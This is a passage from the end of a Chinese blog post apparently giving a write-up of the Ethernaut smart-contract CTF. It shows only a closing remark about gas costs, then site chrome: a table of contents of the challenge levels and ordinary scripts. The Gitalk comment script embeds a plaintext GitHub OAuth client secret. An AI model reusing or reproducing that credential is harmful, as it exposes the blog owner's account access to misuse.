<li>gas消耗的把握，访问storage会消耗大量的gas，如果gas有限，尽量避免访问storage</li>
</ul>
<p>做(chao)了好久好久好久，终于搞定了<del>~</del></p>
<p>​    完结撒花<em>★,°</em>:.☆(￣▽￣)/$:<em>.°★</em> 。</p>
<p>​    </p>

      
    </div>
    
    
    

    

    

    
      <div>
        <ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>本文作者：</strong>
    hxzy
  </li>
  <li class="post-copyright-link">
    <strong>本文链接：</strong>
    <a href="http://hxzy.me/2019/11/09/Ethernaut%20WriteUp/" title="Ethernaut WriteUp">http://hxzy.me/2019/11/09/Ethernaut%20WriteUp/</a>
  </li>
  <li class="post-copyright-license">
    <strong>版权声明： </strong>
    本博客所有文章除特别声明外，均采用 https://creativecommons.org/licenses/by-nc-sa/3.0/ 许可协议。转载请注明出处！
  </li>
</ul>

      </div>
    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/%E5%AE%89%E5%85%A8/" rel="tag"><i class="fa fa-tags"></i> 安全</a>
          
            <a href="/tags/Ethernaut/" rel="tag"><i class="fa fa-tags"></i> Ethernaut</a>
          
            <a href="/tags/WriteUp/" rel="tag"><i class="fa fa-tags"></i> WriteUp</a>
          
            <a href="/tags/solidity/" rel="tag"><i class="fa fa-tags"></i> solidity</a>
          
        </div>
      

      <div>
        
          
        
      </div>

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/11/19/bypass-cdn/" rel="prev" title="信息收集——绕过CDN寻找真实IP">
                信息收集——绕过CDN寻找真实IP <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
        
  <div class="bdsharebuttonbox">
    <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
    <a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
    <a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
    <a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
    <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
    <a href="#" class="bds_tieba" data-cmd="tieba" title="分享到百度贴吧"></a>
    <a href="#" class="bds_twi" data-cmd="twi" title="分享到Twitter"></a>
    <a href="#" class="bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
    <a href="#" class="bds_more" data-cmd="more"></a>
    <a class="bds_count" data-cmd="count"></a>
  </div>
  <script>
    window._bd_share_config = {
      "common": {
        "bdText": "",
        "bdMini": "2",
        "bdMiniList": false,
        "bdPic": ""
      },
      "share": {
        "bdSize": "16",
        "bdStyle": "0"
      },
      "image": {
        "viewList": ["tsina", "douban", "sqq", "qzone", "weixin", "twi", "fbook"],
        "viewText": "分享到：",
        "viewSize": "16"
      }
    }
  </script>

<script>
  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
</script>

      
    </div>
  </div>


          </div>
          


          

  
    <div id="gitalk-container"></div>

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/images/avatar.gif"
                alt="hxzy" />
            
              <p class="site-author-name" itemprop="name">hxzy</p>
              <p class="site-description motion-element" itemprop="description">不吃饱，哪有力气敲代码。</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/%7C%7C%20archive">
              
                  <span class="site-state-item-count">4</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">2</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">8</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/xzy012" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mailto:xuzhiyi1001@outlook.com" target="_blank" title="E-Mail">
                      
                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                  </span>
                
            </div>
          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                大佬列表
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="http://xuing.cn/" title="xuing" target="_blank">xuing</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Zeppelin-Ethernaut-WriteUp"><span class="nav-number">1.</span> <span class="nav-text">Zeppelin-Ethernaut-WriteUp</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Hello-Ethernaut"><span class="nav-number">1.1.</span> <span class="nav-text">Hello Ethernaut</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Fallback"><span class="nav-number">1.2.</span> <span class="nav-text">Fallback</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Fallout"><span class="nav-number">1.3.</span> <span class="nav-text">Fallout</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Coin-Flip"><span class="nav-number">1.4.</span> <span class="nav-text">Coin Flip</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Telephone"><span class="nav-number">1.5.</span> <span class="nav-text">Telephone</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Token"><span class="nav-number">1.6.</span> <span class="nav-text">Token</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Delegation"><span class="nav-number">1.7.</span> <span class="nav-text">Delegation</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Force"><span class="nav-number">1.8.</span> <span class="nav-text">Force</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Vault"><span class="nav-number">1.9.</span> <span class="nav-text">Vault</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#King"><span class="nav-number">1.10.</span> <span class="nav-text">King</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Re-entrancy"><span class="nav-number">1.11.</span> <span class="nav-text">Re-entrancy</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Elevator"><span class="nav-number">1.12.</span> <span class="nav-text">Elevator</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Privacy"><span class="nav-number">1.13.</span> <span class="nav-text">Privacy</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Gatekeeper-One"><span class="nav-number">1.14.</span> <span class="nav-text">Gatekeeper One</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Gatekeeper-Two"><span class="nav-number">1.15.</span> <span class="nav-text">Gatekeeper Two</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Naught-Coin"><span class="nav-number">1.16.</span> <span class="nav-text">Naught Coin</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Preservation"><span class="nav-number">1.17.</span> <span class="nav-text">Preservation</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Locked"><span class="nav-number">1.18.</span> <span class="nav-text">Locked</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Recovery"><span class="nav-number">1.19.</span> <span class="nav-text">Recovery</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MagicNumber"><span class="nav-number">1.20.</span> <span class="nav-text">MagicNumber</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Alien-Codex"><span class="nav-number">1.21.</span> <span class="nav-text">Alien Codex</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Denial"><span class="nav-number">1.22.</span> <span class="nav-text">Denial</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Shop"><span class="nav-number">1.23.</span> <span class="nav-text">Shop</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#View-函数"><span class="nav-number">1.23.0.0.1.</span> <span class="nav-text">View 函数</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#Gas-estimation-failed"><span class="nav-number">1.23.0.0.1.1.</span> <span class="nav-text">Gas estimation failed</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">hxzy</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>




<div id="days"></div>
<script>
function show_date_time(){
    window.setTimeout("show_date_time()", 1000);
    BirthDay=new Date("10/27/2019 00:00:00");//修改为自己的blog建站时间
    today=new Date();
    timeold=(today.getTime()-BirthDay.getTime());
    sectimeold=timeold/1000
    secondsold=Math.floor(sectimeold);
    msPerDay=24*60*60*1000
    e_daysold=timeold/msPerDay
    daysold=Math.floor(e_daysold);
    e_hrsold=(e_daysold-daysold)*24;
    hrsold=setzero(Math.floor(e_hrsold));
    e_minsold=(e_hrsold-hrsold)*60;
    minsold=setzero(Math.floor((e_hrsold-hrsold)*60));
    seconds=setzero(Math.floor((e_minsold-minsold)*60));
    document.getElementById('days').innerHTML="本站已安全运行"+daysold+"天"+hrsold+"小时"+minsold+"分"+seconds+"秒";
}
function setzero(i){
    if (i<10)
    {i="0" + i};
    return i;
}
show_date_time();
</script>
        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="site-uv">
      本站访客数
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
      人
    </span>
  

  
    <span class="site-pv">
      本站总访问量
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
      次
    </span>
  
</div>








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  









  <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">

  <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>

  <script src="/js/src/md5.min.js"></script>
   <script type="text/javascript">
        var gitalk = new Gitalk({
          clientID: '7834f2c22d33806630a5',
          clientSecret: 'a43dfc39fc90fd24ac2f0b468447096a12e64d6f',
          repo: 'gitalk',
          owner: 'xzy012',
          admin: ['xzy012'],
          id: md5(location.pathname),
          labels: ['Gitalk'],
          perPage: 15,
          pagerDirection: 'last',
          createIssueManually: false,
          distractionFreeMode: false
        })
        gitalk.render('gitalk-container')           
       </script>


  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('-1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  

  
<script>
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>


  
  

  

  

  

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hibiki.model.json"},"display":{"position":"right","width":200,"height":500},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body>
</html>

<!-- 页面点击小红心 -->
<script type="text/javascript" src="/js/src/clicklove.js"></script>